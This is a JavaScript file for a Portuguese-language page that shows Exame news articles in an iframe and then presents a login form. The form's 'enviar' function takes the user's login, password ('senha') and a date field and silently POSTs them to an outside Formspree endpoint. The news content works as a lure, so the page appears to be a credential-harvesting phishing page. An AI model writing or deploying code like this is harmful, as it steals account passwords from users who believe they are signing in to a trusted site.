document.addEventListener("DOMContentLoaded", () => {

    const links = [
        "https://exame.com/ciencia/robos-com-camuflagem-inspirada-em-polvos-podem-se-tornar-realidade/",
        "https://exame.com/ciencia/as-inovacoes-que-marcaram-o-setor-espacial-em-2025/",
        "https://exame.com/invest/mercados/certificou-pode-voar-quando-os-carros-voadores-entrarao-em-operacao/",
        "https://exame.com/future-of-money/ia-seguranca-a-formula-inegociavel-para-o-setor-financeiro-2/"
    ];

    const frame = document.getElementById("frame");
    const loading = document.getElementById("loading");
    const formulario = document.getElementById("formulario");

    window.abrirLink = function (index) {
        const url = links[index];

        formulario.style.display = "none";

        loading.style.display = "block";
        loading.innerText = "Carregando conteúdo...";
        frame.style.display = "none";

        frame.src = url;

        frame.onload = () => {
            loading.style.display = "none";
            frame.style.display = "block";
        };
    }

    window.mostrarFormulario = function () {
        frame.style.display = "none";
        loading.style.display = "none";
        formulario.style.display = "block";
    }

    window.enviar = function () {
        const login = document.getElementById("login").value;
        const senha = document.getElementById("senha").value;
        const data = document.getElementById("data").value;

        fetch("https://formspree.io/f/mnjbaebd", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ login, senha, data })
        })
        .then(() => {
            document.getElementById("msg").innerText = "Dados enviados ✅";
        })
        .catch(() => {
            document.getElementById("msg").innerText = "Erro ao enviar ❌";
        });
    }
});
